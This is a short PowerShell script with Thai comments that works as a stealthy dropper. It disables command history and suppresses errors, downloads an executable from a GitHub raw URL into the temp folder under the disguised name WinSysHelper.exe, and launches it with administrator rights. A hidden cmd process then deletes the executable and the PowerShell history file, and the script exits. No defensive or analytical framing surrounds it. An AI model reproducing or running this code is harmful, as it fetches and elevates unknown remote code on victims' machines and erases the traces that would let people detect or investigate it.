# 1. ปิดการทิ้งประวัติ (Disable History) ก่อนเริ่มทำงาน
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
$ErrorActionPreference = 'SilentlyContinue'

# 2. ตั้งที่อยู่ไฟล์และดาวน์โหลด
$output = "$env:TEMP\WinSysHelper.exe"
$url = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"

if (Test-Path $output) { Remove-Item $output -Force }

try {
    (New-Object System.Net.WebClient).DownloadFile($url, $output)
} catch {
    Invoke-WebRequest -Uri $url -OutFile $output
}

# 3. เช็คและรัน EXE แบบ Admin
if (Test-Path $output) {
    # รัน EXE (บาสจะรันแบบ -Wait หรือไม่ก็ได้ แต่แนะนำให้ไม่ Wait เพื่อให้สคริปต์ทำงานต่อจนจบได้ทันที)
    Start-Process -FilePath $output -Verb RunAs
}

# 4. เปิดการทิ้งประวัติกลับมาเป็นปกติ (Enable History)
try { Set-PSReadlineOption -HistorySaveStyle SaveIncrementally } catch {}

# 5. ลบไฟล์ประวัติทิ้ง (Remove History File)
# ใช้ CMD สั่งลาเพื่อเลี่ยงปัญหาไฟล์ถูกล็อค (ไฟล์ประวัติมักจะลบตรงๆ ไม่ได้ขณะเปิด PS)
$historyPath = (Get-PSReadlineOption).HistorySavePath
$clean = "timeout /t 5 && del /f /q `"$output`" && del /f /q `"$historyPath`""
Start-Process cmd -ArgumentList "/c $clean" -WindowStyle Hidden

# 6. ปิด PowerShell ทันที
exit
